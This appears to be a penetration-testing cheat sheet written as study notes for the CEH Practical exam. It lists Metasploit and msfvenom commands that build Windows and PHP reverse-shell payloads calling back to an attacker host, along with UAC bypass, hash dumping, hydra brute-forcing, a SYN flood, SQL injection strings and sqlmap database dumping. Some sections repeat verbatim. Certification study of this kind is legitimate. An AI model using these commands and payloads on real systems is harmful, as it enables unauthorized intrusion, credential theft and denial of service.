# netdiscover
ifconfig
netdiscover -i eth0
netdiscover -i eth0 -r ip/24

# android
msf > android/meterpreter
dump_sms
geoloca

# msf hardware
msf > use auxiliary/server/local_hwbridge
msf > use auxiliary/client/hwbridge/connect

# Win password dump + ophcrack
pwdump7.exe > c:\hashes.txt
ophcrack.exe install tables (vista free) | crack

# vuln VNC session
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=your_ip LPORT=4444 -o Rev_shell.exe
python3 -m http.server 8888
msf > use multi/handler
msf > set payload windows/meterpreter/reverse_tcp
meterpreter > sysinfo && run vnc

# another vuln
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=your_ip LPORT=4444 -f exe > Exploit.exe
# priv escal
getsystem -t 1
use exploit/windows/local/bypassuac_fodhelper
run post/windows/gather/smart_hashdump

# stego
openstego.exe > extract data
quickstego.exe 

# fatrat

# msfconsole + db
service postgresql start
msfdb init
msfconsole
db_status

# msfconsole + nmap
nmap -T4 -sS -sV -A -oX Recon ip/24
db_import Recon
hosts
services
db_nmap -sS -A ip

# msfconsole context
use scanner/smb/smb_version
snmp_login
snmp_enum

# enum4linux
enum4linux -u username -p password -U/o/P/G/S ip

# gobuster/dirb/uniscan
gobuster -e -u http://10.10.10.10 -w wordlsit.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-*.txt -x jpg,png,php,aspx,css,html
dirb http://10.10.10.10 wordlist.txt

# nikto
nikto -h http://www.target.com (optional: -Tuning 1)

# wpscan
wpscan --url http://target/ --enumerate u/vp
msf > search wordpress_login_enum



Gaining Access & System Hacking


# Win password dump + ophcrack
pwdump7.exe > c:\hashes.txt
ophcrack.exe install tables (vista free) | crack

# vuln VNC session
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=your_ip LPORT=4444 -o Rev_shell.exe
python3 -m http.server 8888
msf > use multi/handler
msf > set payload windows/meterpreter/reverse_tcp
meterpreter > sysinfo && run vnc

# another vuln
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=your_ip LPORT=4444 -f exe > Exploit.exe
# priv escal
getsystem -t 1
use exploit/windows/local/bypassuac_fodhelper
run post/windows/gather/smart_hashdump

# stego
openstego.exe > extract data
quickstego.exe 

# fatrat

# responder
responder -l eth0

# hydra 
hydra -L /root/Desktop/Wordlists/Usernames.txt -P /Passwords.txt ftp://ip
hydra -t 4 -l <username_placeholder> -P /usr/share/wordlists/rockyou.txt -vV <ip_address> <protocol>

# file upload vuln
msfvenom -p php/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f raw

# synflood
msf > tcp/synflood

SQL Injection

blah' or 1=1 --
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—

sqlmap -u "http://target.com/asdfds.asdf?id=1" --cookie="" --dbs
sqlmap -u "http://target.com/asdfds.asdf?id=1" --cookie="" -D testing -T what --dump (-os-shell)
# to get cookie
document.cookie


Cryptography

#Making custom wordlist from website keywords:

cewl example.com -m 5 -w words.txt
# where cewl is the tool, 
# example.com is the site, 
# -m is to specify the minimum length of the word, 
# -w is to specify the output file

Social engineering

use SET tools on kali

https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
https://anontuttuvenus.medium.com/ceh-practical-exam-review-185ea4cef82a
